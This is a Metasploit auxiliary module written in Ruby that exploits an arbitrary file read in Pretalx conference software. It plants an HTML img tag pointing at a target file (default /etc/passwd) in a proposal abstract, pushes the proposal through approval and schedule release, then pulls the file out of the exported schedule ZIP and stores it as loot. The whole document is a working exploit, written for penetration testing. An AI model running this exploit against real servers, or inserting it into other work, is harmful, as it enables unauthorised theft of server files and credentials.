##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zip'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Pretalx
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Pretalx Arbitrary File Read/Limited File Write',
        'Description' => 'This module exploits functionality in Pretalx that export conference schedule as zipped file. The Pretalx will iteratively include any file referenced by any HTML tag and does not properly check the path of the file, which can lead to arbitrary file read. The module requires crendetials that allow schedule export, schedule release and approval of proposals. Additionaly, module requires conference name and URL for media files.',
        'Author' => [
          'Stefan Schiller', # security researcher
          'msutovsky-r7' # module dev
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
      OptString.new('FILE_CONTENT', [false, 'Content to overwritten file']),
      OptString.new('MEDIA_URL', [true, 'Prepend path to file path that allows arbitrary read', '/media']),
      OptString.new('EMAIL', [true, 'User email to Pretalx backend']),
      OptString.new('PASSWORD', [true, 'Password to Pretalx backend'])
    ])
  end

  def check_host(_ip)
    return Exploit::CheckCode::Unknown('Login failed, please check credentials') unless login(datastore['EMAIL'], datastore['PASSWORD'])

    version_element = get_version

    return Exploit::CheckCode::Detected unless version_element

    version = Rex::Version.new(version_element)

    return Exploit::CheckCode::Appears("Detected vulnerable version #{version}") if version <= Rex::Version.new('2.3.1')

    Exploit::CheckCode::Safe("Detected version #{version} is not vulnerable")
  end

  def run_host(ip)
    vprint_status('Register malicious proposal')

    proposal_info = {
      abstract: %<(<img src="#{datastore['MEDIA_URL']}//#{datastore['FILEPATH']}"/>>,
      email: datastore['EMAIL'],
      password: datastore['PASSWORD']
    }

    registration_info = register_proposal(proposal_info)
    proposal_name = registration_info[:proposal_name]
    vprint_status("Submit proposal #{proposal_name}")

    cookie_jar.clear

    vprint_status("Logging with credentials: #{datastore['EMAIL']}/#{datastore['PASSWORD']}")
    fail_with Failure::NoAccess, 'Incorrect credentials' unless login(datastore['EMAIL'], datastore['PASSWORD'])

    vprint_status('Approving proposal')
    approve_proposal(proposal_name)

    vprint_status("Adding #{proposal_name} to schedule")
    fail_with(Failure::Unknown, 'Failed to add submission to schedule') unless add_proposal_to_schedule(proposal_name)
    vprint_status('Releasing schedule')
    release_schedule

    vprint_status('Exporting schedule')
    export_zip

    vprint_status('Wait for schedule ZIP to be exported')

    sleep(5)

    vprint_status('Trying to extract target file')

    zip_data = download_zip

    zip = Zip::File.open_buffer(zip_data)
    target_entry = zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}")
    fail_with Failure::PayloadFailed, 'Failed to extract target file, check if export worked' unless target_entry
    extracted_content = zip.read(zip.find_entry(target_entry))

    vprint_status('Extraction successful')

    loot_path = store_loot(
      "pretalx.#{datastore['FILEPATH']}",
      'text/plain',
      ip,
      extracted_content,
      "pretalx-#{datastore['FILEPATH']}.txt",
      'Pretalx'
    )
    print_status("Stored results in #{loot_path}")

    report_vuln({
      host: rhost,
      port: rport,
      name: name,
      refs: references,
      info: "Module #{fullname} successfully leaked file"
    })
  end

end
